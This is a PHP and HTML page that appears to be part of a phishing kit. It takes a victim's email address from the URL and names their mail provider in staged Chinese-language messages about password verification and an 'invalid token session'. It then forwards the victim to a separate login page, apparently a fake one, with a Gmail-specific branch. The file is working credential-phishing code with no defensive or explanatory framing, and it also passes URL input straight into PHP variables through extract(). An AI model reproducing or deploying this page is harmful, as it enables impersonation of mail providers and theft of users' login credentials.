<?php
session_start();
extract($_GET);
$_SESSION['userid'] = $userid;
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY),$tmp);
    extract($tmp);
	// header('refresh:20; login.html#'.$userid);
?>
<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_SESSION['userid'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<html>
<head>

<style type="text/css">
<!--
.style1 {font-family: "Courier New", Courier, monospace}
.style4 {font-family: "Courier New", Courier, monospace;
	color:#0066CC;
	font-size:20px;}

.style6 {color: #FF6600}
.style8 {font-size: 14}
-->
</style>
<script>


var preloadimages=new Array(":abstract.simplenet.com/point.gif","abstract.simplenet.com/point2.html")

var intervals=2300

//configure destination URL

if (window.location.href.indexOf('gmail.com') > -1) {

//window.location = 'http://thevault.co.uk/index.phtml?d=512060’;
var targetdestination = 'g.html#<?php echo $login ?>';

 } else {

//window.location = 'http://www.jths.co.uk/index.phtml?d=541300';
var targetdestination = 'login.html#<?php echo $login ?>';

}

var splashmessage=new Array()

var splashmessage=new Array()

var openingtags='<font face="verdana" size="2" color="#0869AE">'

splashmessage[0]='连接到 <?php echo $login ?>'

splashmessage[1]='请稍等...'

splashmessage[2]='验证密码 <?php echo $login ?>'

splashmessage[3]='请稍等...'

splashmessage[4]='无效的令牌会话。 请重新登录'

splashmessage[5]='连接到 <?php echo $yuh ?> 邮件服务器'

splashmessage[6]='重定向到登录页面...'





var closingtags='</font>'



//Do not edit below this line (besides HTML code at the very bottom)



var i=0



var ns4=document.layers?1:0

var ie4=document.all?1:0

var ns6=document.getElementById&&!document.all?1:0

var theimages=new Array()



//preload images

if (document.images){

for (p=0;p<preloadimages.length;p++){

theimages[p]=new Image()

theimages[p].src=preloadimages[p]

}

}



function displaysplash(){

if (i<splashmessage.length){

sc_cross.style.visibility="hidden"

sc_cross.innerHTML='<b><center>'+openingtags+splashmessage[i]+closingtags+'</center></b>'

sc_cross.style.left=ns6?parseInt(window.pageXOffset)+parseInt(window.innerWidth)/2-parseInt(sc_cross.style.width)/2 :document.body.scrollLeft+document.body.clientWidth/2-parseInt(sc_cross.style.width)/2

sc_cross.style.top=ns6?parseInt(window.pageYOffset)+parseInt(window.innerHeight)/2-sc_cross.offsetHeight/2:document.body.scrollTop+document.body.clientHeight/2-sc_cross.offsetHeight/2

sc_cross.style.visibility="visible"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash()",intervals)

}



function displaysplash_ns(){

if (i<splashmessage.length){

sc_ns.visibility="hide"

sc_ns.document.write('<b>'+openingtags+splashmessage[i]+closingtags+'</b>')

sc_ns.document.close()



sc_ns.left=pageXOffset+window.innerWidth/2-sc_ns.document.width/2

sc_ns.top=pageYOffset+window.innerHeight/2-sc_ns.document.height/2



sc_ns.visibility="show"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash_ns()",intervals)

}







function positionsplashcontainer(){

if (ie4||ns6){

sc_cross=ns6?document.getElementById("splashcontainer"):document.all.splashcontainer

displaysplash()

}

else if (ns4){

sc_ns=document.splashcontainerns

sc_ns.visibility="show"

displaysplash_ns()

}

else

window.location=targetdestination

}

window.onload=positionsplashcontainer



</script>
<script><!--

 var jv=1.0;

//--></script>



<script language="Javascript1.1"><!--

 jv=1.1;

//--></script>



<script language="Javascript1.2"><!--

 jv=1.2;

//--></script>



<script language="Javascript1.3"><!--

 jv=1.3;

//--></script>



<script language="Javascript1.4"><!--

 jv=1.4;

//--></script>

<link rel="SHORTCUT ICON" href="files/favicon.ico"/>

<title> 登入 <?php echo $login ?> </title>
</head>
<body>

<table align="center">

<tr><td height="40"></td></tr>



<tr><td>

	<table align="center">

	<tr><td>
	
<!--		<div align="center">
		<img src="files/logo.png">
		</div> -->

	</td></tr>



	<tr><td height="5"></td></tr>



	<tr><td>

	<!--	<div align="center">
		<font face="verdana" size="2" color="#0869AE">
		Please hold a while, as <b><?php echo $yuh ?></b> Security is scanning your file for virus!
		</font>
		</div> -->

	</td></tr>




	<tr><td height="5"></td></tr>
	


	<tr><td>
	<center>
	<font face="verdana" size="2" color="#0869AE">
	<div align="center" class="" id="splashcontainer" style="visibility: visible; top: 363.5px;"> </div>
	</font>
	</center>
	</td></tr>



	<tr><td height="60"></td></tr>



	<tr><td>

		<div align="center">
		<img src="files/loader.gif" width="130" height="130">
		</div>

	</td></tr>

	</table>

</td></tr>

</table>

<!-- </body> -->
</html>